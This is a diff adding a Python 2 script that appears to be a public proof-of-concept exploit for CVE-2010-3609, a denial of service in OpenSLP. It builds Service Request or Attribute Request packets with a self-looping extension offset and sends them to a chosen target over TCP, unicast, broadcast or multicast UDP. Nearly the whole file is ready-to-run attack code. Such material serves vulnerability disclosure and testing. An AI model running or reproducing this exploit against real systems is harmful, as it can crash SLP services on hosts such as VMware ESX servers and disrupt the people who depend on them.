@@ -1,0 +1,300 @@
+#!/usr/bin/python
+
+# Title: OpenSLP DoS
+# Author: Nicolas Gregoire (@Agarri_FR)
+# CVE: 2010-3609
+# Software download: http://www.openslp.org/download.html 
+# Version: v1.2.1 and trunk before revision 1647
+# Tested on: Linux Ubuntu 10.04, VMware ESX 4.0
+# Notes: It affects some others SLP softwares, like mSLP. More details (in French) on my blog => http://goo.gl/s0zHq
+
+''' ==================================
+          Pseudo documentation 
+================================== '''
+
+# SLPick, extension DoS release
+# by Nicolas Gregoire
+
+''' ==================================
+             Imports 
+================================== '''
+
+import getopt
+import re
+import sys
+import binascii
+import struct
+import socket
+import os
+
+
+''' ==================================
+        Default values
+================================== '''
+
+version = '0.4'
+mode = 'unicast'
+source = 'N/A'
+target = 'N/A'
+xid = '\x12\x34'
+port = 427
+nb = 1
+req = 'sr'
+
+''' ==================================
+        Standard functions
+================================== '''
+
+# Some nice formatting
+def zprint(str):
+	print '[=] ' + str
+
+# Function displaying CLI arguments
+def showUsage():
+    print 'Usage : ' + sys.argv[0] + ' [-h] [-m mode] [-p port] [-n number] [-s source_IP] [-t target_IP]'
+    print '\t[-h] Help (this text)'
+    print '\t[-m] Mode : tcp / unicast / broadcast / multicast (default is "' + mode + '")'
+    print '\t[-p] Port : default is "' + str(port) + '"'
+    print '\t[-s] Source IP Adress : no default (used only in multicast mode)'
+    print '\t[-t] Target IP Adress : no default (forced in multicast mode)'
+    print '\t[-n] Number of extensions : 0 (no bug) / 1 (default) / 2 (trailing extension)'
+    print '\t[-r] Request type : sr (ServerRequest, default) / ar (AttributeRequest)'
+    sys.exit(1)
+
+# Function parsing parameters
+def getArguments():
+    try:
+        optlist, list = getopt.getopt(sys.argv[1:], 'hm:p:t:s:n:r:')
+    except getopt.GetoptError:
+        showUsage()
+    for opt in optlist:
+        if opt[0] == '-h':
+            showUsage()
+        if opt[0] == '-p':
+            global port
+            port = opt[1]
+        if opt[0] == '-s':
+            global source
+            source = opt[1]
+        if opt[0] == '-t':
+            global target
+            target = opt[1]
+        if opt[0] == '-m':
+            global mode
+	    mode = opt[1]
+        if opt[0] == '-n':
+            global nb
+	    nb = int(opt[1])
+        if opt[0] == '-r':
+            global req
+	    req = opt[1]
+
+# Function checking parameters
+def checkArguments():
+    if (mode == 'multicast'):
+        # XID : must be 0 in multicast mode
+        # Target IP : default SLP multicast address
+        # Source IP : address of the local interface 
+        global xid
+        xid = '\x00\x00'
+	zprint('Forcing XID to "0"')
+        global target
+	target = '239.255.255.253'
+	zprint('Forcing target IP to "' + target + '"')
+        if (source != 'N/A') :
+	    zprint('Forcing source IP to "' + source + '"')
+        else:
+	    zprint('You need to force the source address with "-s" !')
+            showUsage()
+    elif (mode == 'unicast') or (mode == 'broadcast') or (mode == 'multicast') or (mode == 'tcp'):
+        # Target IP : must be defined
+        if (target == 'N/A') :
+            zprint('Invalid target !')
+            showUsage()
+    else :
+        zprint('Invalid mode !')
+        showUsage()
+
+''' ==================================
+        SLP functions
+================================== '''
+
+# Define payload of type "Service Request"
+def getServRequest():
+
+	zprint('Creating payload of type "Service Request"')
+
+	# Function type
+	f = '\x01'
+	# Empty fields
+	previous_list_length = '\x00\x00'
+	predicate_length = '\x00\x00'
+	scope_length = '\x00\x00'
+	spi_length = '\x00\x00'
+	# Variable-size fields
+	service = 'service:directory-agent'
+	service_length = struct.pack('!h', len(service)) 
+	# Create message
+	m = previous_list_length + service_length + service
+	m += predicate_length + scope_length + spi_length
+
+	return(f, m)
+
+# Define payload of type "Attribute Request"
+def getAttrRequest():
+
+	zprint('Creating payload of type "Attribue Request"')
+
+	# Function type
+	f = '\x06'
+	# Empty fields
+	previous_list_length = '\x00\x00'
+	tag_length = '\x00\x00'
+	spi_length = '\x00\x00'
+	# Variable-size fields
+	url = 'http://www.agarri.fr/'
+	url_length = struct.pack('!h', len(url)) 
+	scope = 'default'
+	scope_length = struct.pack('!h', len(scope)) 
+	# Create message
+	m = previous_list_length
+	m += url_length + url + scope_length + scope
+	m += tag_length + spi_length
+
+	return(f, m)
+
+# Define the function creating the full SLP packet
+def createPacket(function, message):
+
+	zprint('Adding headers and trailers')
+
+	# SLP Version
+	version = '\x02'
+        # Set the 'Multicast required' flag to 1
+	if (mode == 'broadcast' or mode == 'multicast'):
+	    flags = '\x20\x00'
+        else:
+            flags = '\x00\x00'
+
+        #######################################################
+        # Here's the bug !!!!
+        #######################################################
+        zprint('Using ' + str(nb) + ' extension(s)')
+        if (nb == 0):
+            # No extension == no bug
+	    next_ext_offset = '\x00\x00\x00'
+	    extension = ''
+	elif (nb == 1):
+            # Loop over itself
+	    next_ext_offset = '\x00\x00\x05'
+	    extension = ''
+        elif (nb == 2) :
+            # Point to another extension located at the end of the packet
+            # TODO : Calculate it at runtime
+	    if (req == 'sr'):
+                next_ext_offset = '\x00\x00\x31'
+            else :
+                next_ext_offset = '\x00\x00\x36'
+            # OpenSLP : extid should be < 0x4000 or > 0x7FFF 
+	    ext_id = '\xBA\xBE'
+            # Loop over itself, 0x05 (back to previous extension) should work too 
+	    ext_nextoffset = next_ext_offset
+	    # Could be anything
+            ext_data = '\x22\x22'
+	    # Create the trailing extension
+            extension = ext_id + ext_nextoffset + ext_data
+        else:
+	    print 'Wrong number of extensions'
+            sys.exit(1)
+
+	# Variable-size headers
+	lang = 'en'
+	lang_length = struct.pack('!h', len(lang)) 
+
+	# Assemble headers
+	headers = flags + next_ext_offset + xid + lang_length + lang
+
+	# Packet = version + function + overall size + headers + message + extension
+	packet = version + function + '\x00'
+	packet += struct.pack('!h', len(headers + message + extension) + 5) 
+	packet += headers + message + extension
+
+	return packet
+
+''' ==================================
+           Send packet via TCP or UDP
+================================== '''
+
+# Send via TCP
+def sendTcpPacket(packet):
+
+	zprint('Sending packet via TCP [' + target + ']')
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.settimeout(3)
+        try:
+            s.connect((target, port))
+        except socket.error:
+            zprint('Socket error (port closed ?)')
+            sys.exit(1)
+	s.send(packet)
+	s.close
+
+# Send via unicast UDP
+def sendUnicastPacket(packet):
+
+	zprint('Sending packet via Unicast UDP [' + target + ']')
+	s = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
+	s.sendto( packet, (target, port) )
+
+# Send via broadcast UDP
+def sendBroadcastPacket(packet):
+
+        zprint('Sending packet via Broadcast UDP [' + target + ']')
+	s = socket.socket( socket.AF_INET, socket.SOCK_DGRAM )
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+	s.sendto( packet, (target, port) )
+
+# Send via multicast UDP
+def sendMulticastPacket(packet):
+
+	zprint('Sending packet via Multicast UDP [' + target + ']')
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+	sock.bind((source, 6666)) # Select an interface (and an evil port ;-)
+	sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
+	sock.sendto(packet, (target, port) );
+
+''' ==================================
+           Main code
+================================== '''
+
+# Print banner
+zprint('SLPick : SLP client v' + version + ' (by Nicolas Gregoire)')
+
+# Set options
+getArguments()
+checkArguments()
+
+# Which payload ?
+if (req == 'ar'):
+    func, payload = getAttrRequest()
+else :
+    func, payload = getServRequest()
+
+# Add headers and trailers (including extensions)
+packet = createPacket(func, payload)
+
+# TCP
+if (mode == 'tcp'):
+	sendTcpPacket(packet)
+# UDP
+elif (mode == 'unicast'):
+	sendUnicastPacket(packet)
+elif (mode == 'broadcast'):
+	sendBroadcastPacket(packet)
+elif (mode == 'multicast'):
+	sendMulticastPacket(packet)
+
+# Exit
+zprint('Exit')
+
+
